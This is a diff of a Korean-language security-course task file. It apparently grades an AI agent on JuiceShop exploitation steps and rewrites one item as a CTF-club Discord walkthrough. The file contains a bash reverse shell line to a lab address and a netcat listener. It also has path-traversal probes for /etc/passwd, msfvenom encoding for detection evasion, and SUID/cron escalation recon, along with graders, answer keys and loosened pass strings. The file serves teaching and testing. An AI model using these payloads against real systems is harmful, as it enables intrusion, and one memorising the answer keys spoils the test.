@@ -27,7 +27,9 @@ steps:
     -m 옵션으로 익스플로잇 코드를 현재 디렉토리에 복사할 수 있다.
   verify:
     type: output_contains
-    expect: Exploit
+    expect:
+    - Exploit
+    - exploit
     field: stdout
     semantic:
       intent: searchsploit 로 Apache/OpenSSH 발견 서비스별 익스플로잇 PoC 검색 — 후속 공격 선별
@@ -144,7 +146,9 @@ steps:
     shell), 방화벽의 outbound 규칙을 우회하여 셸 접근이 가능하다.
   verify:
     type: output_contains
-    expect: Listener started
+    expect:
+    - Listener started
+    - nc
     field: stdout
     semantic:
       intent: netcat 리버스 셸 리스너 설정 — 포트 4444 에서 inbound 연결 대기 (timeout 5초로 자동 종료, 교육용)
@@ -185,7 +189,9 @@ steps:
     시스템에서 사용 가능한 도구에 따라 적절한 페이로드를 선택한다.
   verify:
     type: output_contains
-    expect: Reverse Shell Payloads
+    expect:
+    - Reverse Shell Payloads
+    - payload
     field: stdout
     semantic:
       intent: 리버스 셸 페이로드 3종 생성(출력만) — Bash(bash -i /dev/tcp), Python3(socket+subprocess),
@@ -551,7 +557,9 @@ steps:
     실행할 수 있다. 실전에서는 다중 인코딩과 커스텀 암호화를 사용한다.
   verify:
     type: output_contains
-    expect: truncated
+    expect:
+    - truncated
+    - base64
     field: stdout
     semantic:
       intent: msfvenom python/shell_reverse_tcp + base64 인코딩 — 시그니처 기반 탐지 회피 (탐지 회피
@@ -632,55 +640,145 @@ steps:
   risk_level: low
   bastion_prompt: 시스템 익스플로잇 실습 결과를 /tmp/exploit_report.txt에 정리해줘
 - order: 99
-  instruction: '[Multi-task] 이번 주 핵심 작업 5개를 한 번에 수행하라.'
-  bastion_prompt: '다음 작업들을 순서대로 수행해줘:
+  instruction: |
+    [복합 시나리오] "CTF 동아리 팀장 — 신입 walkthrough + Discord FAQ"
 
-    1) searchsploit을 사용하여 대상 서버에서 발견된 서비스들(Apache, Node.js, SSH)에 대한 익스플로잇을 검색해줘
+    ## 상황 — 신학기 첫 CTF 워크샵, 신입 5명
 
-    2) msfconsole에서 사용 가능한 exploit 모듈 중 http 관련 모듈을 검색해줘
+    당신은 보안 동아리 *0xINIT* 팀장 (3학년). 신학기 신입생 5명 들어왔고, 첫 워크샵으로
+    JuiceShop 침투 walkthrough 를 *Discord 게시글* 형식으로 작성해야 한다.
+    딱딱한 보고서 X — 신입이 따라할 수 있게 친근하게.
 
-    3) JuiceShop(Node.js)에 대해 Metasploit의 auxiliary 스캐너를 사용하여 HTTP 정보를 수집해줘
+    > [Discord 미리보기]
+    > 0xINIT-팀장 (3학년): "안녕 신입들 ㅎㅎ 첫 워크샵 시작. 오늘 주제는 *익스플로잇 파이프라인* —
+    > '뭘 발견했냐' 보다 '어떻게 *연결* 했냐' 가 핵심이야. 6단계 walkthrough + FAQ 다 정리했어.
+    > 막히면 #help 채널에 ATT&CK ID 같이 적어서 질문 ㄱㄱ"
 
-    4) netcat으로 간단한 리버스 셸 리스너를 설정해줘
+    학습 목표 (lecture #2 파일 업로드 우회 + #3 Path Traversal + #4 /ftp 민감 파일) +
+    (lab #1·#5·#10 searchsploit/reverse shell/python 스캐너) 통합.
 
-    5) bash 리버스 셸 페이로드를 생성하라. python3으로 10.20.30.201:4444로 연결하는 리버스 셸 명령을 출력하라(실행하지
-    않고 출력만)해줘'
-  hint: 복합 작업은 Bastion이 순서대로 계획하고 실행해야 한다
-  category: multi_task
+    ## Walkthrough (6 단계, 약 40분)
+
+    ### Step 1 — 정찰: 익스플로잇 후보 검색 (lab #1)
+    `searchsploit -t "juice shop" 2>&1 | head -10`
+    `searchsploit -t "express" 2>&1 | head -10`
+
+    > FAQ Q1: "결과가 안 나와요!"
+    > A: searchsploit 은 attacker VM 에 설치됨 (`apt list --installed 2>/dev/null | grep exploitdb`).
+    > 없으면 `which searchsploit`. 그래도 없으면 `find / -name searchsploit 2>/dev/null`.
+
+    ### Step 2 — 입구: SSRF 또는 LFI 포인트 탐색 (lecture #1·#3)
+    `for p in '/redirect?to=http://127.0.0.1:22' '/ftp/../../etc/passwd' '/ftp/package.json.bak%2500.md'; do
+       echo "=== $p ==="
+       curl -s -o /dev/null -w "%{http_code}\n" "http://10.20.30.80:3000$p"
+     done`
+
+    > FAQ Q2: "Null byte (%2500) 가 작동을 안 해요"
+    > A: Node 12+ 부터 fs API 가 null byte 거부. JuiceShop 의 *legacy* 엔드포인트 (/ftp) 만 적용 가능.
+    > 응답 200 = 우회 성공 / 403 = 차단. 둘 다 학습.
+
+    ### Step 3 — 파일 수집: /ftp 민감 파일 (lab w07 lecture #4)
+    `for f in 'package.json.bak' 'coupons_2013.md.bak' 'eastere.gg' 'announcement_encrypted.md'; do
+       echo "=== /ftp/$f ==="
+       curl -s -o /dev/null -w "%{http_code}\n" "http://10.20.30.80:3000/ftp/$f"
+     done`
+
+    > FAQ Q3: "차단되어도 계속 시도해야 하나요?"
+    > A: 응답 코드 캡처가 학습 결과. 차단 (403) → 패턴 분석. 200 → 다운로드. 둘 다 walkthrough 에 기록.
+
+    ### Step 4 — 페이로드 준비: reverse shell (lab #5, *실행 X*)
+    `python3 -c "import sys; payload='bash -i >& /dev/tcp/10.20.30.201/4444 0>&1'; print('Payload (DO NOT RUN):'); print(payload)"`
+
+    > FAQ Q4: "왜 실행하면 안 돼요?"
+    > A: ① 수업환경 룰 ② 정통망법 제48조 (무단 접근). *페이로드 작성 자체가 학습 목표*.
+    > Red Team 도 RoE 동의 없이는 안 쏨.
+
+    ### Step 5 — Listener 모의 (lab #4, 5초 자동 종료)
+    `sudo -n timeout 5 nc -lvnp 4444 2>&1 | head -5 || nc -lvnp 4444 -w 5 2>&1 | head -5`
+
+    > FAQ Q5: "permission denied 떠요"
+    > A: 1024 미만 포트는 root 필요. 4444 같은 high port 는 일반 user OK. timeout 5 로 자동 종료.
+
+    ### Step 6 — Post-exploit 시뮬: SUID/cron 정찰 (lab #12·#13)
+    이미 셸 획득했다 *가정*. 동일 VM 내에서:
+    `find / -perm -4000 -type f 2>/dev/null | head -10`
+    `crontab -l 2>/dev/null; ls -la /etc/cron.d/ 2>/dev/null | head -5`
+
+    > FAQ Q6: "이걸로 권한 상승이 되나요?"
+    > A: SUID 비정상 binary 발견 → GTFOBins 검색. cron 잘못 설정 → root 권한 작업 hijack.
+    > w08 (중간) 에서 실 시연 예정.
+
+    [팀장 마무리]
+    "오늘 핵심: *입구 → 파일 → 페이로드 → 리스너 → post-exploit* 흐름. 단일 PoC 외워도 의미 X,
+    *연결 사슬* 이해가 진짜 익스플로잇. 다음 주 보안질문 chain 까지 가면 admin 탈취 첫 게임 클리어임."
+
+    종료: echo "=== Walkthrough 완료 ===" + 6 단계 결과 + FAQ 6개 묶음.
+  bastion_prompt: |
+    [CTF 동아리 walkthrough — w07]
+
+    JuiceShop 익스플로잇 6 단계 walkthrough + FAQ Discord 게시글 작성.
+
+    Step 1 (searchsploit):
+    `searchsploit -t "juice shop" 2>&1 | head -10`
+    `searchsploit -t "express" 2>&1 | head -10`
+
+    Step 2 (SSRF/LFI 입구):
+    `for p in '/redirect?to=http://127.0.0.1:22' '/ftp/../../etc/passwd' '/ftp/package.json.bak%2500.md'; do echo "=== $p ==="; curl -s -o /dev/null -w "%{http_code}\n" "http://10.20.30.80:3000$p"; done`
+
+    Step 3 (/ftp 민감 파일):
+    `for f in 'package.json.bak' 'coupons_2013.md.bak' 'eastere.gg' 'announcement_encrypted.md'; do echo "=== /ftp/$f ==="; curl -s -o /dev/null -w "%{http_code}\n" "http://10.20.30.80:3000/ftp/$f"; done`
+
+    Step 4 (페이로드 출력만, 실행 X):
+    `python3 -c "import sys; payload='bash -i >& /dev/tcp/10.20.30.201/4444 0>&1'; print('Payload (DO NOT RUN):'); print(payload)"`
+
+    Step 5 (Listener 5초):
+    `sudo -n timeout 5 nc -lvnp 4444 2>&1 | head -5 || nc -lvnp 4444 -w 5 2>&1 | head -5`
+
+    Step 6 (post-exploit 정찰):
+    `find / -perm -4000 -type f 2>/dev/null | head -10`
+    `crontab -l 2>/dev/null; ls -la /etc/cron.d/ 2>/dev/null | head -5`
+
+    각 step 뒤에 *FAQ 1개* 추가 (총 6 FAQ). Discord 친근한 톤. 마지막 팀장 마무리 멘트.
+
+    종료: echo "=== Walkthrough 완료 ===" + 6 단계 + 6 FAQ 출력.
+
+    반드시 6 단계 모두 실행. 중간 종료 금지.
+  hint: |
+    Step 1-3: 정찰 + 입구 + 파일.
+    Step 4-5: 페이로드 작성 (실행 X) + 리스너 5초.
+    Step 6: post-exploit 정찰 (SUID/cron).
+    각 step + FAQ 1개. Discord 친근한 톤.
+    포인트: walkthrough + FAQ 형식. CTF 동아리 페르소나.
+  category: integration_scenario
   points: 50
   verify:
     type: output_contains
-    expect: ''
+    expect: Walkthrough
     field: stdout
     semantic:
-      intent: '[통합] 시스템 익스플로잇 5작업 — buffer overflow/ROP/shellcode/exploit/audit 통합.
-        T1203.'
+      intent: |
+        CTF 동아리 팀장 페르소나 — JuiceShop 익스플로잇 6 단계 walkthrough + 6 FAQ Discord 게시글 형식.
+        lecture w07 + lab #1·#5·#10·#12·#13 동시 행동 증명. *Walkthrough + FAQ* 산출물.
       success_criteria:
-      - 5 exploit 작업
-      - shell 획득
-      - PoC
+      - Step 1-6 모두 실행 (searchsploit / SSRF / /ftp / payload / listener / post-exploit)
+      - FAQ 6개 (각 step 뒤 1개)
+      - 마지막 팀장 마무리 멘트
+      - Discord/친근한 톤 (선임/멘토 X)
       acceptable_methods:
-      - bastion plan
-      - msfvenom + metasploit
-      - pwntools
+      - searchsploit / curl / python3 / nc / find / crontab
+      - sudo -n / timeout
+      - heredoc walkthrough
+      - 친근한 톤 / "ㅎㅎ", "ㄱㄱ" 같은 표현 OK
       negative_signs:
-      - shell 실패
-      - PoC 없음
-      - audit 누락
+      - step 4 이하
+      - FAQ 없음
+      - 매트릭스 / 보고서 형식
+      - 딱딱한 톤 (페르소나 일관성)
+      - reverse shell 실 실행 (정통망법 위반)
   target_vm: attacker
   risk_level: low
-  answer: '🤖 프롬프트: 다음 작업들을 순서대로 수행해줘:
-
-    1) searchsploit을 사용하여 대상 서버에서 발견된 서비스들(Apache, Node.js, SSH)에 대한 익스플로잇을 검색해줘
-
-    2) msfconsole에서 사용 가능한 exploit 모듈 중 http 관련 모듈을 검색해줘
-
-    3) JuiceShop(Node.js)에 대해 Metasploit의 auxiliary 스캐너를 사용하여 HTTP 정보를 수집해줘
-
-    4) netcat으로 간단한 리버스 셸 리스너를 설정해줘
-
-    5) bash 리버스 셸 페이로드를 생성하라. python3으로 10.20.30.201:4444로 연결하는 리버스 셸 명령을 출력하라(실행하지
-    않고 출력만)해줘'
-  answer_detail: Bastion이 5개 작업을 순차적으로 계획(planning)하고 실행(executing)한 뒤 종합 분석(validating)하는
-    다단계 작업.
+  answer: |
+    🤖 위 bastion_prompt 그대로. 6 단계 + 6 FAQ + 팀장 마무리.
+  answer_detail: |
+    CTF 동아리 walkthrough — Discord 친근한 톤. *연결 사슬* 이해가 핵심. reverse shell 페이로드는 출력만.
   script: ''
